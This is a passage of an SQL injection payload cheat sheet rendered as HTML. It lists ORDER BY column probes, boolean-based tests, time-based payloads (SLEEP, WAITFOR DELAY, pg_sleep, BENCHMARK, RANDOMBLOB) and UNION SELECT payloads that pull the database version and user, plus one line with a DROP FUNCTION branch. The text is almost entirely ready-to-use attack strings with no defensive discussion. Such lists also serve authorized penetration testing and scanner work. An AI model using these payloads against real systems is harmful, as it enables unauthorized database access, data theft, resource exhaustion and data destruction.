\n ORDER BY 5# \n ORDER BY 6# \n ORDER BY 7# \n ORDER BY 8# \n ORDER BY 9# \n ORDER BY 10# \n ORDER BY 11# \n ORDER BY 12# \n ORDER BY 13# \n ORDER BY 14# \n ORDER BY 15# \n ORDER BY 16# \n ORDER BY 17# \n ORDER BY 18# \n ORDER BY 19# \n ORDER BY 20# \n ORDER BY 21# \n ORDER BY 22# \n ORDER BY 23# \n ORDER BY 24# \n ORDER BY 25# \n ORDER BY 26# \n ORDER BY 27# \n ORDER BY 28# \n ORDER BY 29# \n ORDER BY 30#\n ORDER BY 31337#\n ORDER BY 1 \n ORDER BY 2 \n ORDER BY 3 \n ORDER BY 4 \n ORDER BY 5 \n ORDER BY 6 \n ORDER BY 7 \n ORDER BY 8 \n ORDER BY 9 \n ORDER BY 10 \n ORDER BY 11 \n ORDER BY 12 \n ORDER BY 13 \n ORDER BY 14 \n ORDER BY 15 \n ORDER BY 16 \n ORDER BY 17 \n ORDER BY 18 \n ORDER BY 19 \n ORDER BY 20 \n ORDER BY 21 \n ORDER BY 22 \n ORDER BY 23 \n ORDER BY 24 \n ORDER BY 25 \n ORDER BY 26 \n ORDER BY 27 \n ORDER BY 28 \n ORDER BY 29 \n ORDER BY 30 \n ORDER BY 31337 \n RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='\n RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='\nIF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--\nIF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--\n%' AND 8310=8310 AND '%'='\n%' AND 8310=8311 AND '%'='\n and (select substring(@@version,1,1))='X'\n and (select substring(@@version,1,1))='M'\n and (select substring(@@version,2,1))='i'\n and (select substring(@@version,2,1))='y'\n and (select substring(@@version,3,1))='c'\n and (select substring(@@version,3,1))='S'\n and (select substring(@@version,3,1))='X'\n</code></pre>\n<h2 id=\"generic-time-based-sql-injection-payloads\"><a class=\"anchor\" href=\"#generic-time-based-sql-injection-payloads\">#</a> Generic Time Based SQL Injection Payloads</h2>\n<pre><code># from wapiti\nsleep(5)#\n1 or sleep(5)#\n&quot; or sleep(5)#\n' or sleep(5)#\n&quot; or sleep(5)=&quot;\n' or sleep(5)='\n1) or sleep(5)#\n&quot;) or sleep(5)=&quot;\n') or sleep(5)='\n1)) or sleep(5)#\n&quot;)) or sleep(5)=&quot;\n')) or sleep(5)='\n;waitfor delay '0:0:5'--\n);waitfor delay '0:0:5'--\n';waitfor delay '0:0:5'--\n&quot;;waitfor delay '0:0:5'--\n');waitfor delay '0:0:5'--\n&quot;);waitfor delay '0:0:5'--\n));waitfor delay '0:0:5'--\n'));waitfor delay '0:0:5'--\n&quot;));waitfor delay '0:0:5'--\nbenchmark(10000000,MD5(1))#\n1 or benchmark(10000000,MD5(1))#\n&quot; or benchmark(10000000,MD5(1))#\n' or benchmark(10000000,MD5(1))#\n1) or benchmark(10000000,MD5(1))#\n&quot;) or benchmark(10000000,MD5(1))#\n') or benchmark(10000000,MD5(1))#\n1)) or benchmark(10000000,MD5(1))#\n&quot;)) or benchmark(10000000,MD5(1))#\n')) or benchmark(10000000,MD5(1))#\npg_sleep(5)--\n1 or pg_sleep(5)--\n&quot; or pg_sleep(5)--\n' or pg_sleep(5)--\n1) or pg_sleep(5)--\n&quot;) or pg_sleep(5)--\n') or pg_sleep(5)--\n1)) or pg_sleep(5)--\n&quot;)) or pg_sleep(5)--\n')) or pg_sleep(5)--\nAND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe\nAND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='\nAND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)\nAND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--\nAND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#\nSLEEP(5)#\nSLEEP(5)--\nSLEEP(5)=&quot;\nSLEEP(5)='\nor SLEEP(5)\nor SLEEP(5)#\nor SLEEP(5)--\nor SLEEP(5)=&quot;\nor SLEEP(5)='\nwaitfor delay '00:00:05'\nwaitfor delay '00:00:05'--\nwaitfor delay '00:00:05'#\nbenchmark(50000000,MD5(1))\nbenchmark(50000000,MD5(1))--\nbenchmark(50000000,MD5(1))#\nor benchmark(50000000,MD5(1))\nor benchmark(50000000,MD5(1))--\nor benchmark(50000000,MD5(1))#\npg_SLEEP(5)\npg_SLEEP(5)--\npg_SLEEP(5)#\nor pg_SLEEP(5)\nor pg_SLEEP(5)--\nor pg_SLEEP(5)#\n'\\&quot;\nAnD SLEEP(5)\nAnD SLEEP(5)--\nAnD SLEEP(5)#\n&amp;&amp;SLEEP(5)\n&amp;&amp;SLEEP(5)--\n&amp;&amp;SLEEP(5)#\n' AnD SLEEP(5) ANd '1\n'&amp;&amp;SLEEP(5)&amp;&amp;'1\nORDER BY SLEEP(5)\nORDER BY SLEEP(5)--\nORDER BY SLEEP(5)#\n(SELECT * FROM (SELECT(SLEEP(5)))ecMj)\n(SELECT * FROM (SELECT(SLEEP(5)))ecMj)#\n(SELECT * FROM (SELECT(SLEEP(5)))ecMj)--\n+benchmark(3200,SHA1(1))+'\n+ SLEEP(10) + '\nRANDOMBLOB(500000000/2)\nAND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))\nOR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))\nRANDOMBLOB(1000000000/2)\nAND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))\nOR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))\nSLEEP(1)/*' or SLEEP(1) or '&quot; or SLEEP(1) or &quot;*/\n</code></pre>\n<h2 id=\"generic-union-select-payloads\"><a class=\"anchor\" href=\"#generic-union-select-payloads\">#</a> Generic Union Select Payloads</h2>\n<pre><code> ORDER BY SLEEP(5)\n ORDER BY 1,SLEEP(5)\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A'))\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30\n ORDER BY SLEEP(5)#\n ORDER BY 1,SLEEP(5)#\n ORDER BY 1,SLEEP(5),3#\n ORDER BY 1,SLEEP(5),3,4#\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5#\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6#\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7#\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8#\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9#\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10#\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11#\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12#\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13#\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14#\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14#\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15#\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16#\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17#\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#\n ORDER BY SLEEP(5)-- \n ORDER BY 1,SLEEP(5)-- \n ORDER BY 1,SLEEP(5),3-- \n ORDER BY 1,SLEEP(5),3,4-- \n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5-- \n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6-- \n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7-- \n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8-- \n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9-- \n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10-- \n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11-- \n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12-- \n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13-- \n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14-- \n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14-- \n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15-- \n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16-- \n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17-- \n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18-- \n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19-- \n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20-- \n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21-- \n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22-- \n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23-- \n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24-- \n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25-- \n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26-- \n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27-- \n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28-- \n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29-- \n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30-- \n UNION ALL SELECT 1\n UNION ALL SELECT 1,2\n UNION ALL SELECT 1,2,3\n UNION ALL SELECT 1,2,3,4\n UNION ALL SELECT 1,2,3,4,5\n UNION ALL SELECT 1,2,3,4,5,6\n UNION ALL SELECT 1,2,3,4,5,6,7\n UNION ALL SELECT 1,2,3,4,5,6,7,8\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30\n UNION ALL SELECT 1#\n UNION ALL SELECT 1,2#\n UNION ALL SELECT 1,2,3#\n UNION ALL SELECT 1,2,3,4#\n UNION ALL SELECT 1,2,3,4,5#\n UNION ALL SELECT 1,2,3,4,5,6#\n UNION ALL SELECT 1,2,3,4,5,6,7#\n UNION ALL SELECT 1,2,3,4,5,6,7,8#\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9#\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10#\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11#\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12#\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13#\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14#\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15#\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16#\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17#\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#\n UNION ALL SELECT 1-- \n UNION ALL SELECT 1,2-- \n UNION ALL SELECT 1,2,3-- \n UNION ALL SELECT 1,2,3,4-- \n UNION ALL SELECT 1,2,3,4,5-- \n UNION ALL SELECT 1,2,3,4,5,6-- \n UNION ALL SELECT 1,2,3,4,5,6,7-- \n UNION ALL SELECT 1,2,3,4,5,6,7,8-- \n UNION ALL SELECT 1,2,3,4,5,6,7,8,9-- \n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10-- \n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11-- \n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12-- \n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13-- \n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14-- \n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15-- \n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16-- \n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17-- \n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18-- \n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19-- \n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20-- \n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21-- \n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22-- \n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23-- \n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24-- \n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25-- \n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26-- \n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27-- \n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28-- \n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29-- \n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30-- \n UNION SELECT @@VERSION,SLEEP(5),3\n UNION SELECT @@VERSION,SLEEP(5),USER(),4\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30\n UNION SELECT @@VERSION,SLEEP(5),&quot;'3\n UNION SELECT @@VERSION,SLEEP(5),&quot;'3'&quot;#\n UNION SELECT @@VERSION,SLEEP(5),USER(),4#\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5#\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6#\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7#\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8#\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9#\n UNION 